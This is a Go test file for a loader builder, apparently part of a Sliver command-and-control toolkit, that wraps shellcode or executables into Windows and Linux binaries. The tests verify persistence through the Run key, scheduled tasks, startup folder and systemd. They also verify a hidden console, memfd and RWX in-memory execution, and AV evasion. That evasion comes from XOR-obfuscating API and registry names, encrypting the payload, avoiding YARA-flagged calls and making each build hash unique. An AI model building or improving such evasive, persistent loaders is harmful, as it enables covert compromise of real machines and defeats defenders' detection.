package loader

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"
)

func TestNormalizeAndFilename(t *testing.T) {
	o := Options{Payload: []byte{1, 2, 3}, GOOS: "win", GOARCH: "x64", Name: "../evil name!.dll", Persistence: "RUNKEY_HKCU"}
	if err := o.Normalize(); err != nil {
		t.Fatal(err)
	}
	if o.GOOS != "windows" || o.GOARCH != "amd64" {
		t.Fatalf("os/arch = %s/%s", o.GOOS, o.GOARCH)
	}
	if o.Persistence != "runkey_hkcu" {
		t.Fatalf("persist = %s", o.Persistence)
	}
	if o.Name != "evilnamedll" {
		t.Fatalf("name = %q", o.Name)
	}
	if got := Filename("beacon", "windows"); got != "beacon_loader.exe" {
		t.Fatalf("windows filename = %s", got)
	}
	if got := Filename("beacon", "linux"); got != "beacon_loader" {
		t.Fatalf("linux filename = %s", got)
	}
}

func TestNormalizeRejectsBadPersist(t *testing.T) {
	o := Options{Payload: []byte{1}, GOOS: "linux", Persistence: "runkey_hkcu"}
	if err := o.Normalize(); err == nil {
		t.Fatal("expected persist/os mismatch")
	}
}

func TestNormalizeAllPersist(t *testing.T) {
	win := Options{Payload: []byte{1}, GOOS: "windows", Persistence: "all"}
	if err := win.Normalize(); err != nil {
		t.Fatal(err)
	}
	lin := Options{Payload: []byte{1}, GOOS: "linux", Persistence: "all"}
	if err := lin.Normalize(); err != nil {
		t.Fatal(err)
	}
	mac := Options{Payload: []byte{1}, GOOS: "darwin", Persistence: "all"}
	if err := mac.Normalize(); err == nil {
		t.Fatal("darwin has a single persist method; all should be rejected")
	}
}

func TestWindowsAllPersistCallsEveryMethod(t *testing.T) {
	src := windowsSource(Options{Persistence: "all", PersistName: "RuntimeBroker", HideConsole: true})
	if !strings.Contains(src, `persistMethod == "all"`) {
		t.Fatal("all persist must dispatch on persistMethod == all")
	}
	for _, fn := range []string{"persistRun(self)", "persistTask(self)", "persistStartup(self)"} {
		if !strings.Contains(src, fn) {
			t.Fatalf("all persist missing %s", fn)
		}
	}
}

func TestSanitizeStripsInjection(t *testing.T) {
	if got := sanitizeIdent(`"; os.Exit(1); //`, "x"); strings.ContainsAny(got, `";`) {
		t.Fatalf("unsanitized: %q", got)
	}
	if got := sanitizeIdent("9lives", "x"); got[0] < 'A' {
		t.Fatalf("must not start with digit: %q", got)
	}
}

func TestNeedsRDI(t *testing.T) {
	if !NeedsRDI("windows", []byte{'M', 'Z', 0, 0}) {
		t.Fatal("windows MZ should need RDI")
	}
	if NeedsRDI("windows", []byte{0x90, 0xC3}) {
		t.Fatal("raw shellcode should not need RDI")
	}
	if NeedsRDI("linux", []byte{'M', 'Z'}) {
		t.Fatal("linux wrap does not RDI")
	}
	pe := make([]byte, 0x80)
	pe[0], pe[1] = 'M', 'Z'
	pe[0x3c] = 0x40
	pe[0x40], pe[0x41] = 'P', 'E'
	if !LooksLikeFullPE(pe) {
		t.Fatal("full PE not detected")
	}
	if LooksLikeFullPE([]byte{'M', 'Z'}) {
		t.Fatal("truncated MZ is not a full PE")
	}
}

func TestWindowsSourceQuotesUserStrings(t *testing.T) {
	src := windowsSource(Options{
		XORKey:      `key"with"quotes`,
		Persistence: "runkey_hkcu",
		PersistName: "OneDriveUpdater",
		HideConsole: true,
	})
	if !strings.Contains(src, `persistMethod = "runkey_hkcu"`) {
		t.Fatal("missing persist method")
	}
	if !strings.Contains(src, strconv.Quote(`key"with"quotes`)) {
		t.Fatalf("xor key not quoted in source:\n%s", src[:400])
	}
	if strings.Contains(src, "syscall.Exec") {
		t.Fatal("windows stub should not contain unix exec")
	}
}

func TestUnixSourceHasDaemonizeAndPersist(t *testing.T) {
	src := unixSource(Options{Persistence: "systemd_user", PersistName: "helper", HideConsole: true, GOOS: "linux", GOARCH: "amd64"})
	for _, needle := range []string{"func daemonize()", "systemd_user", "Setsid", "ld-linux-x86-64", "sysMemfdCreate = 319", "8 << 20"} {
		if !strings.Contains(src, needle) {
			t.Fatalf("missing %q", needle)
		}
	}
}

func TestUnixSourceCallsPICAsFunction(t *testing.T) {
	src := unixSource(Options{GOOS: "linux", GOARCH: "amd64", PersistName: "x"})
	if strings.Contains(src, `syscall.Syscall(uintptr(unsafe.Pointer(&mem[0]))`) {
		t.Fatal("PIC must not be invoked as a Linux syscall trap")
	}
	if !strings.Contains(src, "func jump(code, stack uintptr)") {
		t.Fatal("missing assembly jump trampoline declaration")
	}
	if !strings.Contains(src, "jump(entry, stk)") {
		t.Fatal("missing PIC jump call")
	}
	if !strings.Contains(src, "sysFork        = 57") && !strings.Contains(src, "sysFork = 57") {
		t.Fatal("linux/amd64 stub must fork before jumping to PIC")
	}
	runIdx := strings.Index(src, "func run(buf []byte)")
	if runIdx < 0 {
		t.Fatal("missing run()")
	}
	runFn := src[runIdx:]
	if i := strings.Index(runFn, "func main()"); i > 0 {
		runFn = runFn[:i]
	}
	if !strings.Contains(runFn, "runELF(buf)") || !strings.Contains(runFn, "return") {
		t.Fatal("ELF path must return without mmap-as-PIC")
	}
	if !strings.Contains(src, "PROT_WRITE | syscall.PROT_EXEC") {
		t.Fatal("PIC map should try RWX so self-decoders can write")
	}
}

func TestWindowsSourceAVHygiene(t *testing.T) {
	src := windowsSource(Options{PersistName: "x", HideConsole: true, XORKey: "k", Persistence: "runkey_hkcu"})
	if !strings.Contains(src, "func jump(code, stack uintptr)") {
		t.Fatal("missing assembly jump trampoline")
	}
	if !strings.Contains(src, "jump(addr, stk)") {
		t.Fatal("missing PIC jump call")
	}
	if !strings.Contains(src, "8 << 20") {
		t.Fatal("windows PIC needs a dedicated stack")
	}
	if !strings.Contains(src, "1 << 6") {
		t.Fatal("Donut/SGN still need RWX (PAGE_EXECUTE_READWRITE = 1<<6)")
	}
	if strings.Contains(src, "CreateThread") || strings.Contains(src, "WaitForSingleObject") {
		t.Fatal("CreateThread/WaitForSingleObject are classic loader YARA")
	}
	for _, s := range []string{
		`"VirtualAlloc"`, `"VirtualProtect"`, `"kernel32.dll"`, `"ntdll.dll"`,
		`"GetConsoleWindow"`, `"FlushInstructionCache"`, `"powershell"`, `"schtasks"`,
		`CurrentVersion\Run`, `pageRWX`, `payload.bin`,
	} {
		if strings.Contains(src, s) {
			t.Fatalf("stub contains plaintext %q", s)
		}
	}
	if strings.Contains(src, "syscall.Exec") {
		t.Fatal("windows stub should not contain unix exec")
	}
	if !strings.Contains(src, "for i := 0; i < len(enc); i++") {
		t.Fatal("ds must XOR by byte index; range over a string skips UTF-8 continuation bytes")
	}
	if strings.Contains(src, "for i := range enc") {
		t.Fatal("ds must not range over the encoded name as a UTF-8 string")
	}
}

func TestXORQuoteRoundTripAllNameKeys(t *testing.T) {
	names := []string{
		"kernel32.dll", "user32.dll", "advapi32.dll",
		"VirtualAlloc", "VirtualProtect", "FlushInstructionCache",
		"GetConsoleWindow", "ShowWindow", "FreeConsole",
		"GetTickCount", "Sleep", "GlobalMemoryStatusEx",
		"RegCreateKeyExW", "RegSetValueExW", "RegCloseKey",
		"schtasks", "/create", "ONLOGON", "APPDATA",
		`Software\Microsoft\Windows\CurrentVersion\Run`,
	}
	for k := 1; k <= 255; k++ {
		dk := byte(k)
		for _, name := range names {
			quoted := xorQuote(name, dk)
			enc, err := strconv.Unquote(quoted)
			if err != nil {
				t.Fatalf("k=%d name=%q: unquote: %v quoted=%s", k, name, err, quoted)
			}
			if len(enc) != len(name) {
				t.Fatalf("k=%d name=%q: encoded len %d want %d", k, name, len(enc), len(name))
			}
			got := make([]byte, len(enc))
			for i := 0; i < len(enc); i++ {
				got[i] = enc[i] ^ dk
			}
			if string(got) != name {
				t.Fatalf("k=%d name=%q: decoded %q", k, name, got)
			}
		}
	}
}

func TestMemfdNR(t *testing.T) {
	if memfdNR("linux", "amd64") != 319 {
		t.Fatal("amd64 memfd")
	}
	if memfdNR("darwin", "amd64") != 0 {
		t.Fatal("darwin has no memfd")
	}
}

func TestBuildLinuxAndWindows(t *testing.T) {
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	payload := bytesRepeat(0x90, 64)
	payload[len(payload)-1] = 0xC3

	linux, err := Build(Options{Payload: payload, GOOS: "linux", GOARCH: "amd64", Name: "tlinux", HideConsole: false})
	if err != nil {
		t.Fatalf("linux build: %v", err)
	}
	raw, err := base64.StdEncoding.DecodeString(linux.DataB64)
	if err != nil {
		t.Fatal(err)
	}
	if len(raw) < 4 || raw[0] != 0x7f || raw[1] != 'E' || raw[2] != 'L' || raw[3] != 'F' {
		t.Fatalf("linux output is not ELF (len=%d)", len(raw))
	}
	if linux.Filename != "tlinux_loader" {
		t.Fatalf("filename = %s", linux.Filename)
	}

	win, err := Build(Options{Payload: payload, GOOS: "windows", GOARCH: "amd64", Name: "twin", HideConsole: true, Persistence: "runkey_hkcu", XORKey: "k"})
	if err != nil {
		t.Fatalf("windows build: %v", err)
	}
	wraw, err := base64.StdEncoding.DecodeString(win.DataB64)
	if err != nil {
		t.Fatal(err)
	}
	if len(wraw) < 2 || wraw[0] != 'M' || wraw[1] != 'Z' {
		t.Fatalf("windows output is not PE (len=%d)", len(wraw))
	}
	if win.Filename != "twin_loader.exe" {
		t.Fatalf("filename = %s", win.Filename)
	}
	if !win.HideConsole || win.Persistence != "runkey_hkcu" {
		t.Fatalf("flags not echoed: %+v", win)
	}
	assertNoLoaderIOCs(t, wraw)
}

func utf16LE(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for i := 0; i < len(s); i++ {
		out = append(out, s[i], 0)
	}
	return out
}

func assertNoLoaderIOCs(t *testing.T, pe []byte) {
	t.Helper()
	// Go runtime already contains VirtualAlloc/CreateThread/kernel32.dll.
	// VirtualProtect and the other loader-only names must not be added in plaintext.
	for _, s := range []string{
		"VirtualProtect", "FlushInstructionCache", "GetConsoleWindow",
		"ShowWindow", "FreeConsole", "GetTickCount", "GlobalMemoryStatusEx",
		"powershell", "schtasks", "payload.bin", "PAGE_EXECUTE_READWRITE",
		`Software\Microsoft\Windows\CurrentVersion\Run`,
	} {
		if bytes.Contains(pe, []byte(s)) {
			t.Errorf("PE contains plaintext %q", s)
		}
		if bytes.Contains(pe, utf16LE(s)) {
			t.Errorf("PE contains UTF-16 %q", s)
		}
	}
}

func TestWindowsPEEncryptsPayload(t *testing.T) {
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	marker := []byte("SLIVER_UI_PLAINTEXT_MARKER_7f3c")
	payload := append(bytesRepeat(0x41, 128), marker...)
	res, err := Build(Options{Payload: payload, GOOS: "windows", GOARCH: "amd64", Name: "encwin", HideConsole: true})
	if err != nil {
		t.Fatalf("windows build: %v", err)
	}
	raw, err := base64.StdEncoding.DecodeString(res.DataB64)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(raw, marker) {
		t.Fatal("plaintext payload marker found in PE; embed must be XOR'd")
	}
	assertNoLoaderIOCs(t, raw)
	if p := os.Getenv("DUMP_PE"); p != "" {
		if err := os.WriteFile(p, raw, 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func sha256hex(b []byte) string {
	s := sha256.Sum256(b)
	return hex.EncodeToString(s[:])
}

func decodeResult(t *testing.T, res *Result) []byte {
	t.Helper()
	raw, err := base64.StdEncoding.DecodeString(res.DataB64)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestBuildAlwaysUniqueHash(t *testing.T) {
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	payload := bytesRepeat(0x90, 128)
	payload[len(payload)-1] = 0xC3
	const key = "same-operator-key"
	win1, err := Build(Options{Payload: payload, GOOS: "windows", GOARCH: "amd64", Name: "uniq1", HideConsole: true, XORKey: key})
	if err != nil {
		t.Fatalf("win1: %v", err)
	}
	win2, err := Build(Options{Payload: payload, GOOS: "windows", GOARCH: "amd64", Name: "uniq2", HideConsole: true, XORKey: key})
	if err != nil {
		t.Fatalf("win2: %v", err)
	}
	w1, w2 := decodeResult(t, win1), decodeResult(t, win2)
	if sha256hex(w1) == sha256hex(w2) {
		t.Fatal("same XOR key produced identical Windows PE hash")
	}
	assertNoLoaderIOCs(t, w1)
	assertNoLoaderIOCs(t, w2)

	lin1, err := Build(Options{Payload: payload, GOOS: "linux", GOARCH: "amd64", Name: "uniql1", HideConsole: false, XORKey: key})
	if err != nil {
		t.Fatalf("lin1: %v", err)
	}
	lin2, err := Build(Options{Payload: payload, GOOS: "linux", GOARCH: "amd64", Name: "uniql2", HideConsole: false, XORKey: key})
	if err != nil {
		t.Fatalf("lin2: %v", err)
	}
	l1, l2 := decodeResult(t, lin1), decodeResult(t, lin2)
	if sha256hex(l1) == sha256hex(l2) {
		t.Fatal("same XOR key produced identical Linux ELF hash")
	}
}

func bytesRepeat(b byte, n int) []byte {
	out := make([]byte, n)
	for i := range out {
		out[i] = b
	}
	return out
}

// linuxAmd64Exit42 is PIC: mov eax, 231; mov edi, 42; syscall (SYS_exit_group).
// SYS_exit (60) only kills the calling thread in a Go process.
var linuxAmd64Exit42 = []byte{0xb8, 0xe7, 0x00, 0x00, 0x00, 0xbf, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05}

func writeLoader(t *testing.T, res *Result) string {
	t.Helper()
	raw, err := base64.StdEncoding.DecodeString(res.DataB64)
	if err != nil {
		t.Fatal(err)
	}
	f, err := os.CreateTemp("", "sliv-loader-run-*")
	if err != nil {
		t.Fatal(err)
	}
	path := f.Name()
	if _, err := f.Write(raw); err != nil {
		f.Close()
		os.Remove(path)
		t.Fatal(err)
	}
	if err := f.Chmod(0o755); err != nil {
		f.Close()
		os.Remove(path)
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		os.Remove(path)
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Remove(path) })
	return path
}

func runLoader(t *testing.T, path string) error {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, path)
	cmd.Env = append(os.Environ(), "SLIV_BG=1") // skip daemonize even if compiled with hide-console
	out, err := cmd.CombinedOutput()
	if err != nil && len(out) > 0 {
		t.Logf("loader output:\n%s", out)
	}
	return err
}

func TestBuildLinuxOtherArch(t *testing.T) {
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	payload := []byte{0xc3}
	for _, arch := range []string{"arm64", "386", "arm"} {
		if _, err := Build(Options{Payload: payload, GOOS: "linux", GOARCH: arch, Name: "t" + arch, HideConsole: false}); err != nil {
			t.Errorf("%s: %v", arch, err)
		}
	}
}

func TestBuildWindowsOtherArch(t *testing.T) {
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	payload := []byte{0x31, 0xC0, 0xC3}
	for _, arch := range []string{"arm64", "386"} {
		res, err := Build(Options{Payload: payload, GOOS: "windows", GOARCH: arch, Name: "twin" + arch, HideConsole: true})
		if err != nil {
			t.Errorf("%s: %v", arch, err)
			continue
		}
		raw, err := base64.StdEncoding.DecodeString(res.DataB64)
		if err != nil {
			t.Errorf("%s decode: %v", arch, err)
			continue
		}
		if len(raw) < 2 || raw[0] != 'M' || raw[1] != 'Z' {
			t.Errorf("%s output is not PE", arch)
		}
		assertNoLoaderIOCs(t, raw)
	}
}

func TestExecuteWindowsPICWine(t *testing.T) {
	if _, err := exec.LookPath("wine"); err != nil {
		t.Skip("wine not installed")
	}
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	res, err := Build(Options{
		Payload:     []byte{0x31, 0xC0, 0xC3},
		GOOS:        "windows",
		GOARCH:      "amd64",
		Name:        "winpic",
		HideConsole: false,
		XORKey:      "k",
		NameKey:     0xC3, // UTF-8 lead byte; ds() must XOR by index, not range-over-string
	})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	path := writeLoader(t, res)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "wine", path)
	cmd.Env = append(os.Environ(), "SLIV_BG=1", "WINEDEBUG=-all")
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		t.Fatalf("wine timed out; PIC was not called/returned:\n%s", out)
	}
	if err != nil {
		t.Fatalf("wine loader: %v\n%s", err, out)
	}
}

func TestExecuteLinuxPIC(t *testing.T) {
	if runtime.GOOS != "linux" || runtime.GOARCH != "amd64" {
		t.Skip("PIC fixture is linux/amd64")
	}
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	res, err := Build(Options{
		Payload:     linuxAmd64Exit42,
		GOOS:        "linux",
		GOARCH:      "amd64",
		Name:        "pictest",
		HideConsole: false,
		XORKey:      "k",
	})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	path := writeLoader(t, res)
	err = runLoader(t, path)
	var ee *exec.ExitError
	if !errors.As(err, &ee) || ee.ExitCode() != 42 {
		t.Fatalf("loader exit = %v (want 42); PIC was not executed", err)
	}
}

func TestExecuteLinuxELF(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("ELF exec fixture needs linux")
	}
	if _, err := lookGo(); err != nil {
		t.Skip(err)
	}
	truePath := "/bin/true"
	if _, err := os.Stat(truePath); err != nil {
		truePath = "/usr/bin/true"
	}
	payload, err := os.ReadFile(truePath)
	if err != nil {
		t.Skip(err)
	}
	if !LooksLikeELF(payload) {
		t.Skip(truePath + " is not ELF")
	}
	res, err := Build(Options{
		Payload:     payload,
		GOOS:        "linux",
		GOARCH:      runtime.GOARCH,
		Name:        "elftrue",
		HideConsole: false,
	})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	path := writeLoader(t, res)
	if err := runLoader(t, path); err != nil {
		t.Fatalf("wrapped /bin/true: %v", err)
	}
}
